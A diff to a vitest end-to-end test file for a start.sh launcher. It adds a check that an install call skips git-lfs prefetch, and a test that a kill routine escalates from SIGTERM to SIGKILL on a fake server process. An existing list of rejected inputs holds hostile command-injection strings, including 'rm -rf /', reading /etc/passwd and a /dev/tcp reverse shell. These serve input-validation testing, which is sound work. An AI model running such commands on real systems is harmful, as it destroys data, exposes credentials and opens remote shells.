@@ -7,7 +7,9 @@
 // See LICENSE in the root of the software repository for the full text of the License.
 
 import { describe, it, expect } from 'vitest';
-import { execSync } from 'node:child_process';
+import { execSync, spawn } from 'node:child_process';
+import fs from 'node:fs';
+import os from 'node:os';
 import path from 'node:path';
 
 // tests/e2e → 包根需退两层（分层重构挪目录时少改了一层，bash 退 127）
@@ -109,7 +111,7 @@ describe('start.sh -c parameter validation', () => {
       'tui;rm -rf /',
       'tui|cat /etc/passwd',
       'tui&&whoami',
-      'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
+      'bash -i >&/dev/tcp/10.0.0.1/8080 0>&1',
       'foo',
     ];
     for (const payload of rejectPayloads) {
@@ -120,4 +122,61 @@ describe('start.sh -c parameter validation', () => {
       });
     }
   });
+});
+
+// 启动关键路径不被 git-lfs 自举预取阻塞：start.sh 调 cpx install.sh 时必须
+// 钉 CPX_SKIP_LFS_SETUP=1（GitHub 直连受限时预取会阻塞 ~2min，实测拉长
+// "杀旧→Ready" 停机窗口）。源码级锁——env 前缀被移除即红。
+describe('start.sh cpx 安装步骤跳过 git-lfs 自举预取', () => {
+  it('PROXY_INSTALL 调用行带 CPX_SKIP_LFS_SETUP=1（启动关键路径零网络等待）', () => {
+    const src = fs.readFileSync(START_SH, 'utf8');
+    const m = src.match(/^(\s*)if (\S+) bash "\$PROXY_INSTALL"/m);
+    expect(m, '未找到 PROXY_INSTALL 调用行（重构须同步本测试）').toBeTruthy();
+    expect(m![2]).toBe('CPX_SKIP_LFS_SETUP=1');
+  });
+});
+
+// -k 击杀升级（SIGTERM → 宽限 → SIGKILL）：next-server 对 SIGTERM 走
+// graceful close——LISTEN 释放但进程与浏览器 keep-alive 连接双等死锁，
+// 浏览器复用旧连接永远转圈（实测 2026-09-20）。行为级 IT：仿真一个忽略
+// SIGTERM 的 "next-server"（cmdline 含 next-server + cwd 在假包根，命中
+// kill_all_insight 的匹配条件），函数必须在宽限后 SIGKILL 补刀——只有
+// SIGTERM 的旧实现杀不掉它，即红。SCRIPT_DIR 指向假包根，真实例零波及。
+describe('start.sh -k 击杀升级（SIGTERM 挂死 → SIGKILL 补刀）', () => {
+  it('忽略 SIGTERM 的 next-server 残存进程在宽限后被 SIGKILL', async () => {
+    const fakeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'startsh-kill-it-'));
+    try {
+      fs.writeFileSync(path.join(fakeRoot, 'next-server-fake.js'),
+        "process.on('SIGTERM', () => {}); setInterval(() => {}, 1000);\n");
+      const fake = spawn(process.execPath, [path.join(fakeRoot, 'next-server-fake.js')], {
+        cwd: fakeRoot,
+        stdio: 'ignore',
+      });
+      const exited = new Promise<number>((resolve) => fake.on('exit', (c) => resolve(c ?? -1)));
+
+      // 源码级单函数提取执行（不动 start.sh 其余逻辑）；先锁升级语义存在
+      const fn = execSync(
+        `sed -n '/^kill_all_insight() {/,/^}/p' ${JSON.stringify(START_SH)}`,
+        { encoding: 'utf8' },
+      );
+      expect(fn).toContain('kill -9');
+      const runner = path.join(fakeRoot, 'runner.sh');
+      fs.writeFileSync(runner, [
+        `SCRIPT_DIR=${JSON.stringify(fakeRoot)}`,
+        `source ${JSON.stringify(path.join(fakeRoot, 'fn.sh'))}`,
+        'kill_all_insight',
+      ].join('\n'));
+      fs.writeFileSync(path.join(fakeRoot, 'fn.sh'), fn);
+      execSync(`bash ${JSON.stringify(runner)}`, { encoding: 'utf8', timeout: 20_000 });
+
+      // 仿真件忽略 SIGTERM：只有 SIGKILL 能终结它——宽限后不死即升级失效
+      const code = await Promise.race([
+        exited,
+        new Promise<number>((_, rej) => setTimeout(() => rej(new Error('仿真件未被 SIGKILL：击杀升级失效')), 8_000)),
+      ]);
+      expect(code).toBeLessThan(0);
+    } finally {
+      fs.rmSync(fakeRoot, { recursive: true, force: true });
+    }
+  }, 30_000);
 });
